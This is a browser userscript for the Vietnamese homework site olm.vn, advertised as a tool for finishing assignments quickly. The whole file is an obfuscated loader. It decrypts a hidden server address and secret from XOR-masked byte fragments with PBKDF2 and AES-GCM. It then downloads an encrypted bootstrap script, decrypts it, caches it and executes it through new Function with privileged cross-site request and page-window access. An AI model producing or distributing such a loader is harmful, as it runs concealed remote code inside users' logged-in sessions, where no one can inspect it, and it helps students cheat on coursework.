// ==UserScript==
// @name         THIÊN TAI TÙ TỘI
// @namespace    dev.luongtuyen
// @version      9.0.1
// @description  hỗ trợ làm bài tập nhanh chóng
// @author       Thiên Tai Tù Tội
// @match        https://olm.vn/*
// @match        https://*.olm.vn/*
// @run-at       document-start
// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      modgame.vercel.app
// @connect      YOUR_SERVER_DOMAIN
// @connect      gamehayvl.com
// @connect      olm.vn
// ==/UserScript==

(function() {
  'use strict';
  const CACHE_KEY = '_tl_boot_cache_v9';
  const enc = new TextEncoder;
  const dec = new TextDecoder;
  const _crypto = typeof crypto !== 'undefined' ? crypto : window.crypto;
  const subtle = _crypto.subtle;

  /* ===== sealed credentials (v9 hardening) ===== */
  const __seal = (function () {
    const _masks = [90, 60, 150];
    const _frags = [
      [173,98,9,183,56,45,52,241,194,213,224,175],
      [163,7,115,193,37,146,150,164,85,69],
      [237,224,248,127,165,251,43,116,182,182]
    ];
    const _saltB64 = 'jsp8rtA+GCJuWjhg5coTaA==';
    const _iter = 120000;
    const _recUrl = { iv: 'zR6Mrj63Fh3oXnqM', data: 'NY1NyWw9LV/SuXV9auCOzFku/VVed+4fl3D8dYHV4W0Mv6IZPQIWsmJB' };
    const _recSec = { iv: 'a6vDlsiKbZ7vmmh3', data: 'QjEU/bGV+lw8YG4GBciqGILpOQAxp0nkjEqXg59CjgcriRu8vHFQIx4wqgkDDhCpqJUldsbjLM5H38MgcCtxr2hXiLe0y1XjvObGhe3haW8=' };

    function _b64ToBytes(b64) {
      const bin = atob(b64);
      const u = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
      return u;
    }
    function _assemble() {
      const out = new Uint8Array(32);
      let o = 0;
      for (let f = 0; f < _frags.length; f++) {
        const fa = _frags[f], m = _masks[f];
        for (let i = 0; i < fa.length; i++) out[o++] = fa[i] ^ m;
      }
      return out;
    }
    async function _open(rec, key) {
      const pt = await subtle.decrypt(
        { name: 'AES-GCM', iv: _b64ToBytes(rec.iv) },
        key,
        _b64ToBytes(rec.data)
      );
      const u8 = new Uint8Array(pt);
      const txt = new TextDecoder().decode(u8);
      for (let i = 0; i < u8.length; i++) u8[i] = 0; // zero buffer sau khi giải mã
      return txt;
    }
    async function open() {
      const pass = _assemble();
      const base = await subtle.importKey('raw', pass, { name: 'PBKDF2' }, false, ['deriveKey']);
      for (let i = 0; i < pass.length; i++) pass[i] = 0;
      const key = await subtle.deriveKey(
        { name: 'PBKDF2', salt: _b64ToBytes(_saltB64), iterations: _iter, hash: 'SHA-256' },
        base,
        { name: 'AES-GCM', length: 256 },
        false,
        ['decrypt']
      );
      const url = await _open(_recUrl, key);
      const secret = await _open(_recSec, key);
      return { url: url, secret: secret };
    }
    return { open: open };
  })();
  /* ===== end sealed credentials ===== */
  try {
    if (typeof window !== 'undefined' && !window.__GMFunc__) {
      window.__GMFunc__ = new Proxy({}, {
        get: function(t, k) {
          if (k in t) return t[k];
          return function() {};
        },
        set: function(t, k, v) {
          t[k] = v;
          return true;
        }
      });
    }
  } catch (_) {}
  const __uw = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
  const __gmStyle = typeof GM_addStyle !== 'undefined' ? GM_addStyle : function(css) {
    try {
      var s = document.createElement('style');
      s.textContent = css;
      (document.head || document.documentElement).appendChild(s);
    } catch (_) {}
  };
  const __gmXhr = typeof GM_xmlhttpRequest !== 'undefined' ? GM_xmlhttpRequest : function(d) {
    d = d || {};
    try {
      var ctrl = typeof AbortController !== 'undefined' ? new AbortController : null;
      var tmo = setTimeout(function() {
        if (ctrl) try {
          ctrl.abort();
        } catch (_) {}
      }, d.timeout || 2e4);
      var opts = {
        method: d.method || 'GET',
        headers: d.headers || {}
      };
      if (ctrl) opts.signal = ctrl.signal;
      if (d.data !== undefined && d.data !== null) opts.body = d.data;
      fetch(d.url, opts).then(function(r) {
        clearTimeout(tmo);
        return r.text().then(function(t) {
          return {
            s: r.status,
            t: t
          };
        });
      }).then(function(o) {
        if (d.onload) d.onload({
          status: o.s,
          responseText: o.t,
          response: o.t,
          readyState: 4
        });
      }).catch(function(e) {
        clearTimeout(tmo);
        if (d.onerror) d.onerror({
          error: String(e && e.message || e)
        });
      });
    } catch (e) {
      if (d.onerror) d.onerror({
        error: String(e && e.message || e)
      });
    }
  };
  function b64ToBytes(b64) {
    const bin = atob(b64);
    const out = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }
  function bytesToHex(buf) {
    const b = new Uint8Array(buf);
    let s = '';
    for (let i = 0; i < b.length; i++) s += b[i].toString(16).padStart(2, '0');
    return s;
  }
  async function apiPrefix(secret) {
    const key = await subtle.importKey('raw', enc.encode(secret), {
      name: 'HMAC',
      hash: 'SHA-256'
    }, false, [ 'sign' ]);
    const sig = await subtle.sign('HMAC', key, enc.encode('godmode:api:prefix:v4'));
    return '/' + bytesToHex(sig).slice(0, 12);
  }
  async function bootstrapKey(secret) {
    const base = await subtle.importKey('raw', enc.encode(secret), 'PBKDF2', false, [ 'deriveBits' ]);
    const bits = await subtle.deriveBits({
      name: 'PBKDF2',
      salt: enc.encode('tl-bootstrap-v8-salt'),
      iterations: 1e3,
      hash: 'SHA-256'
    }, base, 256);
    return subtle.importKey('raw', bits, {
      name: 'AES-GCM'
    }, false, [ 'decrypt' ]);
  }
  function gmFetch(url) {
    return new Promise((resolve, reject) => {
      __gmXhr({
        method: 'GET',
        url: url,
        timeout: 15e3,
        headers: {
          Accept: 'application/json'
        },
        onload: r => resolve({
          status: r.status,
          text: r.responseText
        }),
        onerror: () => reject(new Error('network')),
        ontimeout: () => reject(new Error('timeout'))
      });
    });
  }
  function readCache() {
    try {
      const raw = localStorage.getItem(CACHE_KEY);
      if (!raw) return null;
      const o = JSON.parse(raw);
      return o && typeof o.src === 'string' ? o : null;
    } catch (_) {
      return null;
    }
  }
  function writeCache(v, src) {
    try {
      localStorage.setItem(CACHE_KEY, JSON.stringify({
        v: v,
        src: src,
        t: Date.now()
      }));
    } catch (_) {}
  }
  let __tl_fail_lock = false;
  let __tl_connector_tried = false;
  function fail(msg) {
    if (__tl_fail_lock) return;
    __tl_fail_lock = true;
    if (!__tl_connector_tried) {
      try {
        const c = readCache();
        if (c && c.src) {
          try {
            runConnector(c.src, c.v, true);
            return;
          } catch (_) {}
        }
      } catch (_) {}
    }
    try {
      const div = document.createElement('div');
      div.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#0d1117;color:#ff6b6b;display:flex;align-items:center;justify-content:center;font-family:monospace;font-size:14px;padding:20px;text-align:center;';
      div.textContent = '⚠️ LOADER: không load được vui lòng đợi.' + (msg || '');
      (document.documentElement || document.body).appendChild(div);
    } catch (_) {}
  }
  function runConnector(src, version, fromCache) {
    if (__tl_connector_tried && fromCache) return;
    __tl_connector_tried = true;
    try {
      new Function('GM_xmlhttpRequest', 'GM_addStyle', 'unsafeWindow', src).call(window, __gmXhr, __gmStyle, __uw);
    } catch (e) {
      fail('Lỗi chạy connector: ' + (e && e.message ? e.message : e));
    }
  }
  async function main() {
    let secrets = null;
    try {
      secrets = await __seal.open();
      // Secret chỉ dùng cục bộ để dựng HMAC prefix + khoá giải mã; không đưa vào URL/headers mạng.
      const prefix = await apiPrefix(secrets.secret);
      const key = await bootstrapKey(secrets.secret);
      const r = await gmFetch(secrets.url + prefix + '/bootstrap.js');
      if (r.status === 404) {
        try {
          localStorage.removeItem(CACHE_KEY);
        } catch (_) {}
        fail(' Vui lòng đợi Admin update.');
        return;
      }
      if (r.status !== 200) {
        try {
          localStorage.removeItem(CACHE_KEY);
        } catch (_) {}
        throw new Error('HTTP ' + r.status);
      }
      const json = JSON.parse(r.text);
      if (!json || !json.ok || !json.payload) throw new Error('payload lỗi');
      const iv = b64ToBytes(json.payload.iv);
      const data = b64ToBytes(json.payload.data);
      const plain = await subtle.decrypt({
        name: 'AES-GCM',
        iv: iv
      }, key, data);
      const src = dec.decode(plain);
      writeCache(json.v, src);
      try {
        secrets.url = null;
        secrets.secret = null;
        secrets = null;
      } catch (_) {}
      runConnector(src, json.v, false);
    } catch (e) {
      fail(e && e.message ? e.message : String(e));
    }
  }
  main();
})();
